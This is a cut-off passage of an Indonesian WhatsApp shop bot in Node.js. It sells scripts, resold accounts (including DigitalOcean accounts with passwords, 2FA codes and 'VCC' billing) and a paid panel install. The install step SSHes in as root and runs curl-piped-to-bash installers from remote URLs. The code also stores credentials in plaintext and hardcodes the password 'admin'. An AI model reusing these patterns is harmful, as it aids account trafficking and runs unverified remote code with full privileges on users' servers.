            const data = fs.readFileSync('./dwiaffD/script.json', 'utf8');
            global.scripts = JSON.parse(data);
        } catch (err) {
            return m.reply('⚠️ *Gagal memuat daftar script!*\n📂 Pastikan file *scripts.json* tersedia.');
        }
    }

    // Mencari dan menghapus script berdasarkan nama
    const scriptIndex = global.scripts.findIndex(script => script.name.toLowerCase() === scriptName.toLowerCase());

    if (scriptIndex === -1) {
        return m.reply(`❌ *Script dengan nama "${scriptName}" tidak ditemukan!*`);
    }

    // Menghapus script dari array
    global.scripts.splice(scriptIndex, 1);

    // Menyimpan perubahan ke file scripts.json
    fs.writeFileSync('./dwiaffD/script.json', JSON.stringify(global.scripts, null, 2));

    m.reply(`✅ *Script "${scriptName}" berhasil dihapus!*`);
    break;
}

case 'editsc': {
    if (!isCreator) return reply(mess.owner)

    const args = text.split(' ');

    if (args.length < 3) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/editsc <NamaScriptLama> <NamaScriptBaru> <HargaBaru>\n\nContoh:\n/editsc RafanoV4 RafanoV5 50000`
        );
    }

    const [oldName, newName, newPrice] = args;

    if (!oldName || !newName || isNaN(newPrice)) {
        return m.reply('❌ *Pastikan format benar! NamaScriptBaru tidak boleh kosong dan HargaBaru harus berupa angka.*');
    }

    // Memuat file scripts.json
    if (!global.scripts) {
        try {
            const data = fs.readFileSync('./dwiaffD/script.json', 'utf8');
            global.scripts = JSON.parse(data);
        } catch (err) {
            return m.reply('⚠️ *Gagal memuat daftar script!*\n📂 Pastikan file *scripts.json* tersedia.');
        }
    }

    // Mencari script berdasarkan nama lama
    const scriptIndex = global.scripts.findIndex(script => script.name.toLowerCase() === oldName.toLowerCase());

    if (scriptIndex === -1) {
        return m.reply(`❌ *Script dengan nama "${oldName}" tidak ditemukan!*`);
    }

    // Memperbarui nama dan harga script
    global.scripts[scriptIndex].name = newName;
    global.scripts[scriptIndex].price = parseInt(newPrice);

    // Menyimpan perubahan ke file scripts.json
    fs.writeFileSync('./dwiaffD/script.json', JSON.stringify(global.scripts, null, 2));

    m.reply(`✅ *Script berhasil diperbarui!*\n\n📜 *Nama Lama*: ${oldName}\n📜 *Nama Baru*: ${newName}\n💸 *Harga Baru*: Rp${newPrice}`);
    break;
}
case "buyscript": {
    if (!q) return reply(`
╭─────────❲ *ERROR* ❳──────────╮
*Format salah!*
Gunakan perintah:
/buyscript <NamaScript>

*Contoh:*
/buyscript Nabzx
╰──────────────────────────────╯
`);

    const fs = require('fs');
    const axios = require('axios');
    const fetch = require('node-fetch');
    const cheerio = require('cheerio');

    // Membaca file scripts.json
    let scripts;
    try {
        const data = fs.readFileSync('./dwiaffD/script.json', 'utf-8');
        scripts = JSON.parse(data);
    } catch (error) {
        return reply(`
╭─────────❲ *ERROR* ❳──────────╮
❌ Gagal membaca daftar script!
Pastikan file *scripts.json* ada dan formatnya benar.
╰──────────────────────────────╯
`);
    }

    const scriptName = q.trim();
    const selectedScript = scripts.find(script => script.name.toLowerCase() === scriptName.toLowerCase());

    if (!selectedScript) {
        return reply(`
╭─────────❲ *NOT FOUND* ❳─────────╮
❌ *Script tidak ditemukan!*
Pastikan Anda menggunakan nama script yang benar.
╰──────────────────────────────────╯
`);
    }

    const scriptPrice = selectedScript.price;
    const scriptDownloadLink = selectedScript.url;

    // Buat QRIS pembayaran
    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(
        `https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${scriptPrice}&codeqr=${UrlQr}`
    );

    const teksPembayaran = `
╭────────❲ *PEMBAYARAN* ❳────────╮
Silakan transfer QRIS ini sebelum waktu habis!

📜 *Pembelian*: ${selectedScript.name}
💸 *Harga*: Rp${scriptPrice}
⏳ *Waktu*: 5 menit

🔗 *QRIS Link*: [Klik untuk scan]
⚠ *Peringatan*: Pembelian Ini Tidak Bisa Di Batalkan Jika Tidak Jadi Beli Maka Di Read Saja 
╰────────────────────────────────╯
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_buyscript = true;
    db.users[m.sender].buyscript = {
        msg: msgQr,
        chat: m.sender,
        idOrder: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        scriptName: selectedScript.name,
        scriptUrl: scriptDownloadLink,
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_buyscript) {
                    await dwiaff.sendMessage(db.users[m.sender].buyscript.chat, { text: "⚠️ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].buyscript.msg });
                    await dwiaff.sendMessage(db.users[m.sender].buyscript.chat, { delete: db.users[m.sender].buyscript.msg.key });
                    db.users[m.sender].status_buyscript = false;
                    delete db.users[m.sender].buyscript;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].buyscript.exp();

    while (db.users[m.sender].status_buyscript) {
        await sleep(8000);
        const resultcek = await axios.get(
            `https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`
        );
        const req = resultcek.data.amount;
        if (req == db.users[m.sender].buyscript.amount) {
            db.users[m.sender].status_buyscript = false;

            // Unduh script dari MediaFire sebelum mengirim
            try {
                const response = await fetch('https://r.jina.ai/' + scriptDownloadLink, { 
                    headers: { 'x-return-format': 'html' } 
                });
                if (!response.ok) throw new Error("Gagal mengambil data dari MediaFire!");
                const textHtml = await response.text();
                const $ = cheerio.load(textHtml);
                const TimeMatch = $('div.DLExtraInfo-uploadLocation div.DLExtraInfo-sectionDetails')
                    .text()
                    .match(/This file was uploaded from (.*?) on (.*?) at (.*?)\n/);
                const fileSize = $('a#downloadButton').text().trim().split('\n')[0].trim();
                const result = {
                    title: $('div.dl-btn-label').text().trim() || "Tidak diketahui",
                    filename: $('div.dl-btn-label').attr('title') || "file",
                    url: $('a#downloadButton').attr('href'),
                    size: fileSize || "Tidak diketahui",
                    from: TimeMatch?.[1] || "Tidak diketahui",
                    date: TimeMatch?.[2] || "Tidak diketahui",
                    time: TimeMatch?.[3] || "Tidak diketahui"
                };
                if (!result.url) throw new Error("Gagal mendapatkan link unduhan!");

                const caption = `
✅ *Pembelian Script Berhasil!*\n
📜 *Nama Script:* ${db.users[m.sender].buyscript.scriptName}
📦 *Ukuran:* ${result.size}
📅 *Tanggal Unggah:* ${result.date}
⏰ *Waktu Unggah:* ${result.time}
🌍 *Diupload dari:* ${result.from}

📥 *Script sedang dikirim...*
`;

                await dwiaff.sendMessage(db.users[m.sender].buyscript.chat, { text: caption }, { quoted: db.users[m.sender].buyscript.msg });

                // Kirim file script ke pengguna
                await dwiaff.sendMessage(db.users[m.sender].buyscript.chat, { 
                    document: { url: result.url },
                    mimetype: 'application/octet-stream',
                    fileName: result.filename,
                    caption: "✅ *Script telah berhasil diunduh!*"
                }, { quoted: db.users[m.sender].buyscript.msg });

            } catch (error) {
                await dwiaff.sendMessage(db.users[m.sender].buyscript.chat, { text: `❌ *Gagal mengunduh file:* ${error.message}` }, { quoted: db.users[m.sender].buyscript.msg });
            }

            delete db.users[m.sender].buyscript;
        }
    }
    break;
}
    
case "listakun": {
    // Membaca file accounts.json
    let accounts = [];
    try {
        const data = fs.readFileSync("./dwiaffD/accounts.json", "utf-8");
        accounts = JSON.parse(data);
    } catch (error) {
        return m.reply(
            `❌ *Gagal membaca daftar akun!*\nPastikan file *accounts.json* tersedia dan formatnya benar.`
        );
    }

    // Jika daftar akun kosong
    if (accounts.length === 0) {
        return m.reply("📜 *Daftar akun kosong!* Tambahkan akun menggunakan perintah /addakun.");
    }

    // Membuat pesan daftar akun
    let message = "📂 *Daftar Akun Tersedia:*\n\n";
    accounts.forEach((account, index) => {
        message += `🔢 *No*: ${index + 1}\n`;
        message += `📜 *Nama*: ${account.name}\n`;
        message += `💸 *Harga*: Rp${account.price}\n`;
    });

    m.reply(message);
    break;
}

case "buyakun": {
    if (!q) return m.reply(`
╭─────────❲ *ERROR* ❳──────────╮
*Format salah!*
Gunakan perintah:
/buyakun <NamaAkun>

*Contoh:*
/buyakun NabzxAccount
╰──────────────────────────────╯
`);

    const fs = require('fs');

    // Membaca file accounts.json
    let accounts;
    try {
        const data = fs.readFileSync('./dwiaffD/accounts.json', 'utf-8');
        accounts = JSON.parse(data);
    } catch (error) {
        return m.reply(`
╭─────────❲ *ERROR* ❳──────────╮
❌ Gagal membaca daftar akun!
Pastikan file *accounts.json* ada dan formatnya benar.
╰──────────────────────────────╯
`);
    }

    const accountName = q.trim();
    const selectedAccount = accounts.find(account => account.name.toLowerCase() === accountName.toLowerCase());

    if (!selectedAccount) {
        return m.reply(`
╭─────────❲ *NOT FOUND* ❳─────────╮
❌ *Akun tidak ditemukan!*
Pastikan Anda menggunakan nama akun yang benar.
╰──────────────────────────────────╯
`);
    }

    const accountPrice = selectedAccount.price;

    // Buat QRIS pembayaran
    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(
        `https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${accountPrice}&codeqr=${UrlQr}`
    );

    const teksPembayaran = `
╭────────❲ *PEMBAYARAN* ❳────────╮
Silakan transfer QRIS ini sebelum waktu habis!

📜 *Pembelian*: ${selectedAccount.name}
💸 *Harga*: Rp${accountPrice}
⏳ *Waktu*: 5 menit

🔗 *QRIS Link*: [Klik untuk scan]
⚠ *Peringatan*: Pembelian Ini Tidak Bisa Di Batalkan Jika Tidak Jadi Beli Maka Di Read Saja 
╰────────────────────────────────╯
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_buyaccount = true;
    db.users[m.sender].buyaccount = {
        msg: msgQr,
        chat: m.sender,
        idOrder: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        accountName: selectedAccount.name,
        accountUrl: selectedAccount.url,
        accountEmail: selectedAccount.email,
        accountPassword: selectedAccount.password,
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_buyaccount) {
                    await dwiaff.sendMessage(db.users[m.sender].buyaccount.chat, { text: "⚠️ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].buyaccount.msg });
                    await dwiaff.sendMessage(db.users[m.sender].buyaccount.chat, { delete: db.users[m.sender].buyaccount.msg.key });
                    db.users[m.sender].status_buyaccount = false;
                    delete db.users[m.sender].buyaccount;
                }
            }, 300000); // 5 menit
        }
    };

    await db.users[m.sender].buyaccount.exp();

    while (db.users[m.sender].status_buyaccount) {
        await sleep(8000);
        const resultcek = await axios.get(
            `https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`
        );
        const req = resultcek.data.amount;
        if (req == db.users[m.sender].buyaccount.amount) {
            db.users[m.sender].status_buyaccount = false;

            // Kirim detail akun ke pengguna
            const teksAkun = `
╭────────❲ *BERHASIL* ❳─────────╮
✅ *Pembelian Berhasil!*

📜 *Nama Akun*: ${db.users[m.sender].buyaccount.accountName}
📧 *Email*: ${db.users[m.sender].buyaccount.accountEmail}
🔑 *Password*: ${db.users[m.sender].buyaccount.accountPassword}

✨ Terima kasih telah membeli akun di layanan kami!
╰────────────────────────────────╯
`;
            await dwiaff.sendMessage(db.users[m.sender].buyaccount.chat, { text: teksAkun }, { quoted: db.users[m.sender].buyaccount.msg });
            delete db.users[m.sender].buyaccount;
        }
    }
    break;
}

case "addakun": {
    if (!isCreator) return reply(mess.owner)

    const args = text.split(" ");
    if (args.length < 4) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/addakun <NamaAkun> <Harga> <Password> <Email>\n\nContoh:\n/addakun VIPAccount 50000 SecurePass123 example@mail.com`
        );
    }

    const [name, price, password, ...emailArray] = args;
    const email = emailArray.join(" ");

    // Validasi format email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return m.reply(`❌ *Format email salah!* Pastikan email yang dimasukkan benar.`);
    }

    // Membaca file accounts.json
    let accounts = [];
    try {
        const data = fs.readFileSync("./dwiaffD/accounts.json", "utf-8");
        accounts = JSON.parse(data);
    } catch (error) {
        // Jika file belum ada, maka buat daftar kosong
        accounts = [];
    }

    // Menambahkan akun baru
    const newAccount = { name, price: parseInt(price), password, email };
    accounts.push(newAccount);

    // Menyimpan data ke dalam accounts.json
    fs.writeFileSync("./dwiaffD/accounts.json", JSON.stringify(accounts, null, 2));

    m.reply(`✅ *Akun baru berhasil ditambahkan!*\n\n📜 *Nama Akun*: ${name}\n💸 *Harga*: Rp${price}\n🔑 *Password*: ${password}\n📧 *Email*: ${email}`);
    break;
}

case "getakun": {
    if (!isCreator) return reply(mess.owner)

    const args = text.split(" ");
    if (args.length < 1) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/getakun <NamaAkun>\n\nContoh:\n/getakun VIPAccount`
        );
    }

    const [name] = args;

    // Membaca file accounts.json
    let accounts = [];
    try {
        const data = fs.readFileSync("./dwiaffD/accounts.json", "utf-8");
        accounts = JSON.parse(data);
    } catch (error) {
        return m.reply(`❌ *Data akun tidak ditemukan!* Pastikan file accounts.json tersedia.`);
    }

    // Mencari akun berdasarkan nama
    const account = accounts.find((acc) => acc.name.toLowerCase() === name.toLowerCase());

    if (!account) {
        return m.reply(`❌ *Akun dengan nama "${name}" tidak ditemukan!*`);
    }

    // Menampilkan detail akun
    m.reply(`📜 *Detail Akun:*\n\n👤 *Nama Akun*: ${account.name}\n💸 *Harga*: Rp${account.price}\n🔑 *Password*: ${account.password}\n📧 *Email*: ${account.email}`);
    break;
}

case "delakun": {
    if (!isCreator) return reply(mess.owner)

    const args = text.split(" ");
    if (args.length < 1) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/delakun <NamaAkun>\n\nContoh:\n/delakun VIPAccount`
        );
    }

    const accountName = args.join(" ").trim();

    // Membaca file accounts.json
    let accounts = [];
    try {
        const data = fs.readFileSync("./dwiaffD/accounts.json", "utf-8");
        accounts = JSON.parse(data);
    } catch (error) {
        return m.reply(`❌ *Gagal membaca daftar akun!*\nPastikan file *accounts.json* ada dan formatnya benar.`);
    }

    // Mencari dan menghapus akun berdasarkan nama
    const accountIndex = accounts.findIndex(
        (account) => account.name.toLowerCase() === accountName.toLowerCase()
    );

    if (accountIndex === -1) {
        return m.reply(`❌ *Akun dengan nama "${accountName}" tidak ditemukan!*`);
    }

    // Menghapus akun dari daftar
    const deletedAccount = accounts.splice(accountIndex, 1);

    // Menyimpan perubahan ke dalam dwiaffD/accounts.json
    fs.writeFileSync("./dwiaffD/accounts.json", JSON.stringify(accounts, null, 2));

    m.reply(`✅ *Akun "${deletedAccount[0].name}" berhasil dihapus!*`);
    break;
}

case "listakundo": {
    // Membaca file akundos.json
    let akundos = [];
    try {
        const data = fs.readFileSync("./dwiaffD/akundos.json", "utf-8");
        akundos = JSON.parse(data);
    } catch (error) {
        return m.reply(
            `❌ *Gagal membaca daftar akundo!*\nPastikan file *akundos.json* tersedia dan formatnya benar.`
        );
    }

    // Jika daftar akundo kosong
    if (akundos.length === 0) {
        return m.reply("📜 *Daftar akundo kosong!* Tambahkan akundo menggunakan perintah /addakundo.");
    }

    // Membuat pesan daftar akundo
    let message = "📂 *Daftar Akun DigitalOcean Tersedia:*\n\n";
    akundos.forEach((akundo, index) => {
        message += `🔢 *No*: ${index + 1}\n`;
        message += `📜 *Nama*: ${akundo.name}\n`;
        message += `💸 *Harga*: Rp${akundo.price}\n`;
        message += `🧾 *Bill*: ${akundo.bill}\n`;
        message += `📉 *Jumlah Drop*: ${akundo.drop}\n\n`;
    });

    m.reply(message);
    break;
}

case "addakundo": {  
    if (!isCreator) return reply(mess.owner)  

    const args = text.split(" ");  
    if (args.length < 8) {  
        return m.reply(  
            `❌ *Format salah!*\nGunakan perintah:\n/addakundo <NamaAkun> <Harga> <Password> <Kode2FA> <Email> <Bill> <KodeReferral> <JumlahDrop>\n\nContoh:\n/addakundo DOAkundo 50000 SecurePass123 123456 example@mail.com VCC REF123 3`
        );  
    }  

    const [name, price, password, kode2FA, email, bill, referral, drop] = args;  

    // Membaca file akundos.json  
    let akundos = [];  
    try {  
        const data = fs.readFileSync("./dwiaffD/akundos.json", "utf-8");  
        akundos = JSON.parse(data);  
    } catch (error) {  
        akundos = [];  
    }  

    // Menambahkan akundo DigitalOcean baru  
    const newAkundo = { 
        name, 
        price: parseInt(price), 
        password, 
        kode2FA,  // Menambahkan kode 2FA ke dalam objek akun
        email, 
        bill, 
        referral, 
        drop: parseInt(drop) 
    };  
    akundos.push(newAkundo);  

    // Menyimpan data ke dalam akundos.json  
    fs.writeFileSync("./dwiaffD/akundos.json", JSON.stringify(akundos, null, 2));  

    m.reply(`✅ *Akun DigitalOcean baru berhasil ditambahkan!*\n\n📜 *Nama Akun*: ${name}\n💸 *Harga*: Rp${price}\n🔑 *Password*: ${password}\n🔢 *Kode 2FA*: ${kode2FA}\n📧 *Email*: ${email}\n🧾 *Bill*: ${bill}\n🎟 *Kode Referral*: ${referral}\n📉 *Jumlah Drop*: ${drop}`);  
    break;  
}

case "getakundo": {
    if (!isCreator) return reply(mess.owner)

    const args = text.split(" ");
    if (args.length < 1) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/getakundo <NamaAkun>\n\nContoh:\n/getakundo DOAkundo`
        );
    }

    const [name] = args;

    // Membaca file akundos.json
    let akundos = [];
    try {
        const data = fs.readFileSync("./dwiaffD/akundos.json", "utf-8");
        akundos = JSON.parse(data);
    } catch (error) {
        return m.reply(`❌ *Data akundo tidak ditemukan!* Pastikan file akundos.json tersedia.`);
    }

    // Mencari akundo berdasarkan nama
    const akundo = akundos.find((acc) => acc.name.toLowerCase() === name.toLowerCase());

    if (!akundo) {
        return m.reply(`❌ *Akun dengan nama "${name}" tidak ditemukan!*`);
    }

    // Menampilkan detail akundo
    m.reply(`📜 *Detail Akun DigitalOcean:*\n\n👤 *Nama Akun*: ${akundo.name}\n💸 *Harga*: Rp${akundo.price}\n🔑 *Password*: ${akundo.password}\n📧 *Email*: ${akundo.email}\n🧾 *Bill*: ${akundo.bill}\n🎟 *Kode Referral*: ${akundo.referral}\n📉 *Jumlah Drop*: ${akundo.drop}`);
    break;
}

case "buyakundo": {
    if (!q) return m.reply(`
╭─────────❲ *ERROR* ❳──────────╮
*Format salah!*
Gunakan perintah:
/buyakundo <NamaAkun>

*Contoh:*
/buyakundo NabzxAkundo
╰──────────────────────────────╯
`);

    const fs = require('fs');

    // Membaca file akundos.json
    let akundos;
    try {
        const data = fs.readFileSync('./dwiaffD/akundos.json', 'utf-8');
        akundos = JSON.parse(data);
    } catch (error) {
        return m.reply(`
╭─────────❲ *ERROR* ❳──────────╮
❌ Gagal membaca daftar akundo!
Pastikan file *akundos.json* ada dan formatnya benar.
╰──────────────────────────────╯
`);
    }

    const akundoName = q.trim();
    const selectedAkundo = akundos.find(akundo => akundo.name.toLowerCase() === akundoName.toLowerCase());

    if (!selectedAkundo) {
        return m.reply(`
╭─────────❲ *NOT FOUND* ❳─────────╮
❌ *Akun tidak ditemukan!*
Pastikan Anda menggunakan nama akundo yang benar.
╰──────────────────────────────────╯
`);
    }

    const akundoPrice = selectedAkundo.price;

    // Buat QRIS pembayaran
    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(
        `https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${akundoPrice}&codeqr=${UrlQr}`
    );

    const teksPembayaran = `
╭────────❲ *PEMBAYARAN* ❳────────╮
Silakan transfer QRIS ini sebelum waktu habis!

📜 *Pembelian*: ${selectedAkundo.name}
💸 *Harga*: Rp${akundoPrice}
⏳ *Waktu*: 5 menit

🔗 *QRIS Link*: [Klik untuk scan]
⚠ *Peringatan*: Pembelian Ini Tidak Bisa Dibatalkan Jika Tidak Jadi Beli Maka Diabaikan Saja
╰────────────────────────────────╯
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_buyakundo = true;
    db.users[m.sender].buyakundo = {
        msg: msgQr,
        chat: m.sender,
        idOrder: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        akundoName: selectedAkundo.name,
        akundoEmail: selectedAkundo.email,
        akundoPassword: selectedAkundo.password,
        akundo2FA: selectedAkundo.kode2FA, // Menambahkan kode 2FA
        akundoReferral: selectedAkundo.referral, // Menambahkan kode referral
        akundoDrop: selectedAkundo.drop, // Menambahkan jumlah drop
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_buyakundo) {
                    await dwiaff.sendMessage(db.users[m.sender].buyakundo.chat, { text: "⚠️ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].buyakundo.msg });
                    await dwiaff.sendMessage(db.users[m.sender].buyakundo.chat, { delete: db.users[m.sender].buyakundo.msg.key });
                    db.users[m.sender].status_buyakundo = false;
                    delete db.users[m.sender].buyakundo;
                }
            }, 300000); // 5 menit
        }
    };

    await db.users[m.sender].buyakundo.exp();

    while (db.users[m.sender].status_buyakundo) {
        await sleep(8000);
        const resultcek = await axios.get(
            `https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`
        );
        const req = resultcek.data.amount;
        if (req == db.users[m.sender].buyakundo.amount) {
            db.users[m.sender].status_buyakundo = false;

            // Kirim detail akundo ke pengguna
            const teksAkundo = `
╭────────❲ *BERHASIL* ❳─────────╮
✅ *Pembelian Berhasil!*

📜 *Nama Akun*: ${db.users[m.sender].buyakundo.akundoName}
📧 *Email*: ${db.users[m.sender].buyakundo.akundoEmail}
🔑 *Password*: ${db.users[m.sender].buyakundo.akundoPassword}
🔢 *Kode 2FA*: ${db.users[m.sender].buyakundo.akundo2FA}
🎟 *Kode Referral*: ${db.users[m.sender].buyakundo.akundoReferral}
📉 *Jumlah Drop*: ${db.users[m.sender].buyakundo.akundoDrop}

✨ Terima kasih telah membeli akundo di layanan kami!
╰────────────────────────────────╯
`;
            await dwiaff.sendMessage(db.users[m.sender].buyakundo.chat, { text: teksAkundo }, { quoted: db.users[m.sender].buyakundo.msg });
            delete db.users[m.sender].buyakundo;
        }
    }
    break;
}

case "delakundo": {
    if (!isCreator) return reply(mess.owner)

    const args = text.split(" ");
    if (args.length < 1) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/delakundo <NamaAkun>\n\nContoh:\n/delakundo DOAkundo`
        );
    }

    const akundoName = args.join(" ").trim();

    // Membaca file akundos.json
    let akundos = [];
    try {
        const data = fs.readFileSync("./dwiaffD/akundos.json", "utf-8");
        akundos = JSON.parse(data);
    } catch (error) {
        return m.reply(`❌ *Gagal membaca daftar akundo!*\nPastikan file *akundos.json* ada dan formatnya benar.`);
    }

    // Mencari dan menghapus akundo berdasarkan nama
    const akundoIndex = akundos.findIndex(
        (akundo) => akundo.name.toLowerCase() === akundoName.toLowerCase()
    );

    if (akundoIndex === -1) {
        return m.reply(`❌ *Akun dengan nama "${akundoName}" tidak ditemukan!*`);
    }

    // Menghapus akundo dari daftar
    const deletedAkundo = akundos.splice(akundoIndex, 1);

    // Menyimpan perubahan ke dalam dwiaffD/akundos.json
    fs.writeFileSync("./dwiaffD/akundos.json", JSON.stringify(akundos, null, 2));

    m.reply(`✅ *Akun "${deletedAkundo[0].name}" berhasil dihapus!*`);
    break;
}

case "cekstatus": case "cek-status": {
if (!isCreator) return reply(mess.owner)
let t = text.split(",");
if (t.length < 3) return m.reply(`Contoh:\nid,reff pesanan,id produk`)
let id = t[0]
let reff = t[1]
let pr = t[2]
const proses = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&pin=${pinOrkut}&password=${pwOrkut}&product=${pr}&dest=${id}&refID=${reff}`);
m.reply(proses);
}
break
case "ceksaldo-orkut": {
if (!isCreator) return reply(mess.owner)
const url = `https://h2h.okeconnect.com/trx/balance?memberID=${global.merchantIdOrderKuota}&pin=${pinOrkut}&password=${pwOrkut}`
const res = await fetchJson(url);
const bejirrsultan = `
Berikut Adalah Saldo Orkut Anda ❗

 *• Merchant :* ${global.merchantIdOrderKuota}
 *• Balance :* ${res}
`
m.reply(bejirrsultan)
}
break;
    
case "jasainstallpanel": {
    if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)* Jika Anda Tidak Memiliki Domain Silahkan Ketik .buysubdo"));
    
    let vii = text.split("|");
    if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"));

    const amount = 100000; // Harga install panel
    const UrlQr = global.qrisOrderKuota;

    // Generate QRIS Pembayaran
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    
    const teksPembayaran = `
━━━━━━━━━━━━━━━━━━━━━━━
       💎 *𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 𝙋𝙀𝙈𝘽𝘼𝙔𝘼𝙍𝘼𝙉* 💎
━━━━━━━━━━━━━━━━━━━━━━━

📌 *• ID Transaksi :* ${get.data.result.transactionId}
📌 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
📌 *• Metode :* QRIS
📌 *• Expired :* 5 menit

📝 *Note:*
⚠️ QRIS pembayaran hanya berlaku dalam *5 menit*.  
✅ Setelah pembayaran berhasil, sistem akan otomatis menginstall *Panel* di VPS Anda.

🔻 Ketik *.batalbeli* untuk membatalkan transaksi.  
━━━━━━━━━━━━━━━━━━━━━━━
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { 
        image: { url: get.data.result.qrImageUrl }, 
        caption: teksPembayaran 
    }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].installpanel = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        data: vii,
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(
                        db.users[m.sender].installpanel.chat, 
                        { text: "❌ *QRIS pembayaran telah expired!*" }, 
                        { quoted: db.users[m.sender].installpanel.msg }
                    );
                    await dwiaff.sendMessage(
                        db.users[m.sender].installpanel.chat, 
                        { delete: db.users[m.sender].installpanel.msg.key }
                    );
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].installpanel;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].installpanel.exp();

    // Cek status pembayaran secara berkala
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].installpanel.amount) {
            db.users[m.sender].status_deposit = false;

            let [ipvps, pwvps, domain, domain2, rampanel] = db.users[m.sender].installpanel.data;

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: pwvps
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = domain
const domainnode = domain2
const ramserver = rampanel
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await dwiaff.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
